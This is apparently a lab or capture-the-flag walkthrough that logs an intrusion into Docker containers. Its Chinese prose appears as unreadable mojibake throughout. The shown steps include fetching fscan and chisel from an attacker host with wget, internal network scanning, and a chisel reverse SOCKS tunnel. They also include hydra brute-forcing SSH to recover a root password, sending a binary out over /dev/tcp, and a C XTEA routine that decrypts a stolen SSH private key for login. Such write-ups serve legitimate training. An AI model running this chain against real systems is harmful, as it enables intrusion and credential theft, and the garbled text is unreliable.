drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
bash-4.4# cd hsperfdata_root
cd hsperfdata_root
bash-4.4# ls -al
ls -al
total 40
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 .
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 ..
-rw-------    1 root     root         32768 Jun 27 13:37 1
```

hsperfdata_rootÊòØjavaÁöÑÊó•ÂøóÊ≤°Âï•Ëê•ÂÖªÔºåÂõ†‰∏∫Êàë‰ª¨Â∞±ÊòØÈÄöËøáËøô‰∏™ËøõÊù•ÁöÑ

```
bash-4.4# ip a
ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

### 4.1 ÂÜÖÁΩëÊé¢Êµã

ÊòØ‰∏™dockerÔºåÊãâ‰∏™fscanÊù•Êâ´ÊèèÁΩëÊÆµ

kaliÂºÄÊúçÂä°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ python3 -m http.server 80                                                                                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Êãâ

```
bash-4.4# cd /tmp
cd /tmp
bash-4.4# wget 192.168.205.128/fscan
wget 192.168.205.128/fscan
Connecting to 192.168.205.128 (192.168.205.128:80)
fscan                100% |********************************| 6933k  0:00:00 ETA

bash-4.4# chmod +x fscan
chmod +x fscan
bash-4.4# ./fscan -h 172.17.0.1/16
./fscan -h 172.17.0.1/16

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.17.0.1      is alive
(icmp) Target 172.17.0.2      is alive
(icmp) Target 172.17.0.3      is alive
[*] LiveTop 172.17.0.0/16    ÊÆµÂ≠òÊ¥ªÊï∞Èáè‰∏∫: 3
[*] LiveTop 172.17.0.0/24    ÊÆµÂ≠òÊ¥ªÊï∞Èáè‰∏∫: 3
[*] Icmp alive hosts len is: 3
172.17.0.3:8080 open
172.17.0.1:8080 open
172.17.0.2:22 open
172.17.0.2:80 open
172.17.0.1:80 open
172.17.0.1:22 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.17.0.1         code:200 len:6048   title:Linux Terminal Simulator
[*] WebTitle http://172.17.0.2         code:200 len:2808   title:Êö¥ÂäõÁ†¥Ëß£ÊäÄÊúØËÆ≤Ëß£
[*] WebTitle http://172.17.0.3:8080    code:302 len:0      title:None Ë∑≥ËΩ¨url: http://172.17.0.3:8080/login.html
[*] WebTitle http://172.17.0.1:8080    code:302 len:0      title:None Ë∑≥ËΩ¨url: http://172.17.0.1:8080/login.html
[*] WebTitle http://172.17.0.3:8080/login.html code:200 len:2377   title:Áî®Êà∑ÁôªÂΩï
[*] WebTitle http://172.17.0.1:8080/login.html code:200 len:2377   title:Áî®Êà∑ÁôªÂΩï
Â∑≤ÂÆåÊàê 6/6
[*] Êâ´ÊèèÁªìÊùü,ËÄóÊó∂: 9.823162079s
```

172.17.0.1 ÂÆø‰∏ªÊú∫ 80 8080 22

172.17.0.2 80 22 docker2

17.17.0.3 Êú¨Êú∫

ÈÇ£ÂÖàÁúãÁúã.2Ôºå80ÊòØÂï•

```
bash-4.4# curl 172.17.0.2
curl 172.17.0.2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt;!DOCTYPE html&gt;
&lt;html lang='zh'&gt;
&lt;head&gt;
  &lt;meta charset='UTF-8'&gt;
  &lt;title&gt;Êö¥ÂäõÁ†¥Ëß£ÊäÄÊúØËÆ≤Ëß£&lt;/title&gt;
  &lt;style&gt;
    body {
      font-family: 'Microsoft YaHei', sans-serif;
      background: #f5f7fa;
      color: #333;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #2c3e50;
      color: white;
      padding: 20px;
      text-align: center;
    }

    main {
      max-width: 800px;
      margin: 30px auto;
      padding: 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }

    h2 {
      color: #2c3e50;
      border-bottom: 2px solid #ecf0f1;
      padding-bottom: 5px;
    }

    ul {
      margin-left: 20px;
    }

    code {
      background: #ecf0f1;
      padding: 2px 5px;
      border-radius: 4px;
    }

    footer {
      text-align: center;
      padding: 15px;
      color: #888;
      font-size: 14px;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;header&gt;
    &lt;h1&gt;Êö¥ÂäõÁ†¥Ëß£ÊäÄÊúØËÆ≤Ëß£&lt;/h1&gt;
  &lt;/header&gt;

  &lt;main&gt;
    &lt;h2&gt;‰ªÄ‰πàÊòØÊö¥ÂäõÁ†¥Ëß£Ôºü&lt;/h2&gt;
    &lt;p&gt;Êö¥ÂäõÁ†¥Ëß£ÔºàBrute Force AttackÔºâÊòØ‰∏ÄÁßçÁ©∑‰∏æÊ≥ïÊîªÂáªÊñπÂºèÔºåÊîªÂáªËÄÖÈÄöËøáÂ∞ùËØïÊâÄÊúâÂèØËÉΩÁöÑÂØÜÁ†ÅÁªÑÂêàÔºåÁõ¥Âà∞ÊâæÂà∞Ê≠£Á°ÆÁöÑÂØÜÁ†Å‰∏∫Ê≠¢„ÄÇ&lt;/p&gt;

    &lt;h2&gt;Â∏∏ËßÅÁöÑÊö¥ÂäõÁ†¥Ëß£Á±ªÂûã&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Á∫ØÊö¥ÂäõÁ†¥Ëß£&lt;/strong&gt;Ôºö‰ªé &lt;code&gt;aaaa&lt;/code&gt; Âà∞ &lt;code&gt;zzzz&lt;/code&gt; ÈÄê‰∏™Â∞ùËØïÊâÄÊúâÁªÑÂêà„ÄÇ&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Â≠óÂÖ∏ÊîªÂáª&lt;/strong&gt;Ôºö‰ΩøÁî®È¢ÑËÆæÁöÑÂ∏∏Áî®ÂØÜÁ†ÅÂàóË°®ËøõË°åÂ∞ùËØï„ÄÇ&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Ê∑∑ÂêàÊîªÂáª&lt;/strong&gt;ÔºöÁªìÂêàÂ≠óÂÖ∏ËØçÂíåÂ∏∏ËßÅÂèòÂåñÔºàÂ¶ÇÊ∑ªÂä†123ÔºåÂ§ßÂ∞èÂÜôÂèòÊç¢Á≠âÔºâ„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;Êö¥ÂäõÁ†¥Ëß£ÁöÑÁâπÁÇπ&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;‰∏ç‰æùËµñÊºèÊ¥ûÔºå‰ªÖ‰æùÈù†Â∞ùËØï„ÄÇ&lt;/li&gt;
      &lt;li&gt;ËÄóÊó∂È´òÔºåÂ§çÊùÇÂ∫¶ÈöèÂØÜÁ†ÅÈïøÂ∫¶ÂíåÂ≠óÁ¨¶ÈõÜÂëàÊåáÊï∞Â¢ûÈïø„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÂèØ‰ª•Ë¢´Ëá™Âä®ÂåñËÑöÊú¨ÊâßË°åÔºàÂ¶Ç‰ΩøÁî® Python„ÄÅHydra„ÄÅJohn the Ripper Á≠âÔºâ„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;Èò≤Âæ°Êö¥ÂäõÁ†¥Ëß£ÁöÑÊñπÊ≥ï&lt;/h2&gt;
    &lt;ul&gt;
      &lt;li&gt;ËÆæÁΩÆ&lt;strong&gt;Ë¥¶Êà∑ÈîÅÂÆö&lt;/strong&gt;Á≠ñÁï•Ôºå‰æãÂ¶ÇËøûÁª≠ÈîôËØØ5Ê¨°ÂêéÈîÅÂÆö„ÄÇ&lt;/li&gt;
      &lt;li&gt;Âä†ÂÖ•&lt;strong&gt;È™åËØÅÁ†Å&lt;/strong&gt;ÔºåÈòªÊ≠¢Ëá™Âä®ÂåñËÑöÊú¨„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÈôêÂà∂&lt;strong&gt;ÁôªÂΩïÈÄüÁéá&lt;/strong&gt;ÔºåÂ¶Ç 5 ÂàÜÈíüÂÜÖÊúÄÂ§öÂ∞ùËØï 3 Ê¨°„ÄÇ&lt;/li&gt;
      &lt;li&gt;‰ΩøÁî®&lt;strong&gt;Âº∫ÂØÜÁ†Å&lt;/strong&gt;ÔºàÈïø‰∏îÂ§çÊùÇÁöÑÂØÜÁ†ÅÔºâ„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÁõëÊéßÁôªÂΩïË°å‰∏∫ÔºåÊ£ÄÊµãÂºÇÂ∏∏ÁôªÂΩïÂ∞ùËØï„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;

    &lt;h2&gt;ÂêàÊ≥ïÁî®ÈÄî‰∏éË≠¶Âëä&lt;/h2&gt;
    &lt;p&gt;Êö¥ÂäõÁ†¥Ëß£ÊäÄÊúØÂèØ‰ª•Áî®‰∫éÊ∏óÈÄèÊµãËØïÂíåÂÆâÂÖ®ÂÆ°ËÆ°Ôºå‰ΩÜÂú®Êú™ÁªèÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ã‰ΩøÁî®Â±û‰∫éËøùÊ≥ïË°å‰∏∫„ÄÇËØ∑Âä°ÂøÖÈÅµÂÆàÁõ∏ÂÖ≥Ê≥ïÂæãÊ≥ïËßÑ„ÄÇ&lt;/p&gt;
100  2808  100  2808    0     0  2742k      0 --:--:-- --:--:-- --:--:-- 2742k
/main&gt;
  &lt;!--500-worst-passwords--&gt;
  &lt;footer&gt;
    &amp;copy; 2025 ÁΩëÁªúÂÆâÂÖ®ÊïôÂ≠¶È°µÈù¢ | ‰ªÖ‰æõÂ≠¶‰π†‰∫§ÊµÅ
  &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
```

ÂëäËØâÊàë‰ª¨Êö¥ÂäõÁ†¥Ëß£ÔºåÂπ∂‰∏îÁªô‰∫ÜÂ≠óÂÖ∏500-worst-passwords

ÁΩë‰∏äÊâíÊãâ‰∫Ü‰∏Ä‰∏ã

https://gist.github.com/djaiss/4033452

‰∏ãËΩΩ‰∏ãÊù•ÔºåÁÑ∂ÂêéÊâíÊãâ‰∏Ä‰∏™chiselËøáÊù•

### 4.2 ÂÜÖÁΩëÁ©øÈÄè‰∏éSSHÁàÜÁ†¥

```
bash-4.4# wget 192.168.205.128/chisel
wget 192.168.205.128/chisel
Connecting to 192.168.205.128 (192.168.205.128:80)
chisel               100% |********************************| 9152k  0:00:00 ETA

bash-4.4# chmod +x chisel
chmod +x chisel
```

kaliÂºÄ‰∏™ÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ./chisel server -p 8081 --reverse
2025/06/27 20:52:53 server: Reverse tunnelling enabled
2025/06/27 20:52:53 server: Fingerprint noxPhEnuZCIYVPVU9OBwffbD6OdVDKc9jcSAUtCtbN0=
2025/06/27 20:52:53 server: Listening on http://0.0.0.0:8081
```

ÁÑ∂ÂêéÈù∂Êú∫docker

```
bash-4.4# ./chisel client 192.168.205.128:8081 R:socks
./chisel client 192.168.205.128:8081 R:socks
2025/06/27 13:51:26 client: Connecting to ws://192.168.205.128:8081
2025/06/27 13:51:26 client: Connected (Latency 698.603¬µs)
```

Ëøû‰∏ä‰∫ÜÔºåÁÑ∂Âêé‰ªñÈªòËÆ§ÊòØ‰ΩøÁî®socks5‰ª£ÁêÜsocks5 127.0.0.1 1080 Ôºå‰ΩøÁî®‰ª£ÁêÜÂ∑•ÂÖ∑Âä†‰∏äÂ∞±Â•Ω‰∫Ü

ÊàëËøô‰ΩøÁî®proxychains

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo vim /etc/proxychains4.conf
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ proxychains -q ssh root@172.17.0.2                                                                 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:nCuJTguX/ssJuWNmjLBVoZlUUv1Ygi4k0AFEgPORK5M.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 
Permission denied, please try again.
root@172.17.0.2's password: 

```

hydraÁàÜÁ†¥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ proxychains -q hydra -l root -P 500.txt ssh://172.17.0.2 -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 21:07:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 503 login tries (l:1/p:503), ~8 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: mountain
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 21:07:53
                                  
```

ÁªßÁª≠

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ proxychains -q ssh root@172.17.0.2                                            
root@172.17.0.2's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

6ab28be27b0c:~# ls -al
total 12
drwx------    1 root     root          4096 Jun 26 05:03 .
drwxr-xr-x    1 root     root          4096 Jun 24 17:57 ..
-rw-------    1 root     root            79 Jun 27 14:12 .ash_history
6ab28be27b0c:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
6ab28be27b0c:~# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

ÂêéÈù¢ËøôÈáåÊâíÊãâ‰∫ÜÂæà‰πÖÔºåÊàëÈÉΩÊ≤°ÁúãÂà∞ÔºåÁîöËá≥‰∫éÊàëÈÉΩÂéªÊâìÂÜÖÊ†∏ÊºèÊ¥û‰∫Ü.....

ÂÆûÂú®È°∂‰∏ç‰Ωè‰∫ÜÊÉ≥ÂéªÈóÆ‰ΩúËÄÖÔºå‰ΩúËÄÖÂ∫îËØ•ÊòØÈÇ£Êó∂ÂÄôÊúâ‰∫ãÔºåÁÑ∂ÂêéÊàëÂ∞±ÊÉ≥Âà∞SublargeÂ∫îËØ•ÊòØÊµãËøáÁöÑÔºåÊâÄ‰ª•ÊàëÂ∞±Áõ¥Êé•ÂéªÈóÆ‰ªñ‰∫Ü

SublargeËØ¥ÊòØ/usr/binÊúâ‰∏Ä‰∏™userLogin

```
6ab28be27b0c:~# ls -la /usr/bin/userLogin 
-rwxr-xr-x    1 root     root        772016 Jun 24 13:15 /usr/bin/userLogin
```

## ‰∫î„ÄÅÊèêÊùÉ‰πãË∑ØÔºöËß£ÂØÜÂØÜÈí•‰∏éÊúÄÁªàROOT

Á°ÆÂÆûÊúâÔºåÁÑ∂ÂêéÊàëÂ∞±ÊÉ≥Êµã‰∏Ä‰∏ã‰ªñÁöÑÂäüËÉΩ

```
6ab28be27b0c:~# /usr/bin/userLogin
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin -h
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin --help
error: No such file or directory
```

Ê≤°ÊúâÊúâ‰ª∑ÂÄºÁöÑÔºåÈÇ£ÊàëÂ∞±ÊÉ≥ÊãâËøáÂéªÁªôkali

kaliÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 1234 &gt; userLogin
listening on [any] 1234 ...
```

docker2ÂèëÈÄÅ

```
6ab28be27b0c:~# cat /usr/bin/userLogin &gt; /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
```

‰∏çË°åÔºåÁûÑÁúºshell

```
6ab28be27b0c:~# echo $0
-sh
6ab28be27b0c:~# which bash
/bin/bash
6ab28be27b0c:~# /bin/bash
6ab28be27b0c:~# echo $0
/bin/bash
6ab28be27b0c:~# cat /usr/bin/userLogin &gt; /dev/tcp/192.168.205.128/1234
```

Ë°å‰∫ÜÔºåÊãñÂéªida

### 5.1 ‰∫åËøõÂà∂ÈÄÜÂêë‰∏éXTEAËß£ÂØÜ

Èöè‰æøÊâíÊãâ‰∫Ü‰∏Ä‰∏ãÔºåÊòØ‰∏Ä‰∏™Âä†ÂØÜÁ®ãÂ∫è

‰ΩøÁî®xteaÂä†ÂØÜÔºåËæìÂÖ•Êñá‰ª∂ÊòØid_ed25519ÔºåËæìÂá∫output.enc

ËøôÈáåË¥π‰∫ÜËÄÅÂ§ßÂä≤

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ vim a.c     
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ cat a.c      
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define ENCRYPTED_FILE 'output.enc'
#define DECRYPTED_FILE 'decrypted_file'

const char FIXED_KEY_STR[] = 'key-for-user-ldzid_ed25519';

void gen_key(uint32_t *k) {
    const unsigned char *s = (const unsigned char *)FIXED_KEY_STR;
    for (int i = 0; i &lt; 4; ++i) {
        k[i] = (uint32_t)s[4*i+2] &lt;&lt; 16 |
               (uint32_t)s[4*i+1] &lt;&lt; 8  |
               (uint32_t)s[4*i]        |
               (uint32_t)s[4*i+3] &lt;&lt; 24;
    }
}

void xtea_decrypt(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    const uint32_t delta = 0x9E3779B9;
    const int n_rounds = 64;
    uint32_t sum = delta * n_rounds;

    for (int i = 0; i &lt; n_rounds; ++i) {
        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + k[(sum &gt;&gt; 11) &amp; 3]);
        sum -= delta;
        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + k[sum &amp; 3]);
    }

    v[0] = v0;
    v[1] = v1;
}

int main() {
    FILE *fin, *fout;
    uint32_t key[4];
    uint64_t block;
    size_t br;

    printf('ÂºÄÂßãËß£ÂØÜ...\n');
    printf('ËæìÂÖ•Êñá‰ª∂ÔºàÂä†ÂØÜÔºâ: %s\n', ENCRYPTED_FILE);
    printf('ËæìÂá∫Êñá‰ª∂ÔºàËß£ÂØÜÔºâ: %s\n', DECRYPTED_FILE);

    fin = fopen(ENCRYPTED_FILE, 'rb');
    if (!fin) {
        perror('Êó†Ê≥ïÊâìÂºÄÂä†ÂØÜÊñá‰ª∂');
        return 1;
    }

    fout = fopen(DECRYPTED_FILE, 'wb');
    if (!fout) {
        perror('Êó†Ê≥ïÂàõÂª∫ËæìÂá∫Êñá‰ª∂');
        fclose(fin);
        return 1;
    }

    gen_key(key);

    while ((br = fread(&amp;block, 1, 8, fin)) &gt; 0) {
        if (br != 8) {
            printf('\nË≠¶ÂëäÔºöËØªÂèñÂà∞‰∏çÂÆåÊï¥ÁöÑÊï∞ÊçÆÂùó (%zu Â≠óËäÇ)ÔºåÊñá‰ª∂ÂèØËÉΩÂ∑≤ÊçüÂùè„ÄÇ\n', br);
        }

        xtea_decrypt((uint32_t *)&amp;block, key);
        fwrite(&amp;block, 1, 8, fout);
    }

    fclose(fin);
    fclose(fout);

    printf('\nËß£ÂØÜÂÆåÊàê„ÄÇ\n');
    printf('Ê≥®ÊÑèÔºöÂéüÂßãÊñá‰ª∂ÂèØËÉΩË¢´Â°´ÂÖÖ‰∫ÜÈõ∂Â≠óËäÇ‰ª•ÂØπÈΩê 8 Â≠óËäÇËæπÁïåÔºåÂõ†Ê≠§ËæìÂá∫Êñá‰ª∂Êú´Â∞æÂèØËÉΩ‰ºöÊúâÂ§ö‰ΩôÁöÑÁ©∫Â≠óËäÇ„ÄÇ\n');

    return 0;
}
       
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ gcc a.c -o a                  
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ ./a      
ÂºÄÂßãËß£ÂØÜ...
ËæìÂÖ•Êñá‰ª∂ÔºàÂä†ÂØÜÔºâ: output.enc
ËæìÂá∫Êñá‰ª∂ÔºàËß£ÂØÜÔºâ: decrypted_file

Ëß£ÂØÜÂÆåÊàê„ÄÇ
Ê≥®ÊÑèÔºöÂéüÂßãÊñá‰ª∂ÂèØËÉΩË¢´Â°´ÂÖÖ‰∫ÜÈõ∂Â≠óËäÇ‰ª•ÂØπÈΩê 8 Â≠óËäÇËæπÁïåÔºåÂõ†Ê≠§ËæìÂá∫Êñá‰ª∂Êú´Â∞æÂèØËÉΩ‰ºöÊúâÂ§ö‰ΩôÁöÑÁ©∫Â≠óËäÇ„ÄÇ
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ file decrypted_file
decrypted_file: OpenSSH private key
                             
```

### 5.2 ÊôÆÈÄöÁî®Êà∑ÊùÉÈôêËé∑Âèñ

Âõ†‰∏∫ÊàëËøôkaliÈÉ®ÁΩ≤ÈóÆÈ¢òÔºåÊâÄ‰ª•Ë¶ÅÊãâÂéª/tmpËøûÊé•Ôºå‰Ω†ÁöÑÂ∫îËØ•‰∏çÁî®

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ cp decrypted_file /tmp/id_rsa
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/jiemi]
‚îî‚îÄ$ cd /tmp                      
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ls -al id_rsa    
-rwxr-xr-x 1 kali kali 400  6Êúà27Êó• 21:31 id_rsa
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ chmod 600 id_rsa
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ls -al id_rsa   
-rw------- 1 kali kali 400  6Êúà27Êó• 21:31 id_rsa
            
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ssh ldz@192.168.205.131 -i /tmp/id_rsa     
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:B9Pod6bX/35WGX2264fO3mYHE9TOsUwS6RGy8ZAswug.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.

localhost:~$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
```

ÔºàÁî®Êà∑ÂêçÊòØÂú®userLoginÁöÑ‰º™cÈáåÈù¢ÁúãÂà∞ÁöÑÔºåÂΩìÁÑ∂‰Ω†‰πüÂèØ‰ª•‰ΩøÁî®ssh-keygen -l -fÁúãÔºâÁªßÁª≠Êâæ‰∏úË•ø

```
localhost:~$ ls -la
total 28
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 .
drwxr-xr-x    3 root     root          4096 Apr 28 00:29 ..
-rw-------    1 ldz      ldz             15 Jun 27 22:33 .ash_history
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .ssh
-rw-------    1 ldz      ldz           4178 Jun 26 12:58 .viminfo
-rw-------    1 ldz      ldz             39 Jun 24 10:12 user.txt
localhost:~$ cat user.txt 
flag{ce6560c893e5cfec48e0fd186dc03718}
localhost:~$ cat .viminfo 
# This viminfo file was generated by Vim 9.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Search Pattern:
~MSle0~/Pub

# Command Line History (newest to oldest):
:wq
|2,0,1750913922,,'wq'
:q
|2,0,1750913922,,'q'
:q!
|2,0,1750786392,,'q!'
:Q
|2,0,1750731057,,'Q'

# Search String History (newest to oldest):
?/Pub
|2,1,1750769276,47,'Pub'

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
''1     LINE    0
        vim .ash_history 
|3,1,1,1,1,0,1750913920,'vim .ash_history '
'2      LINE    0
        history 
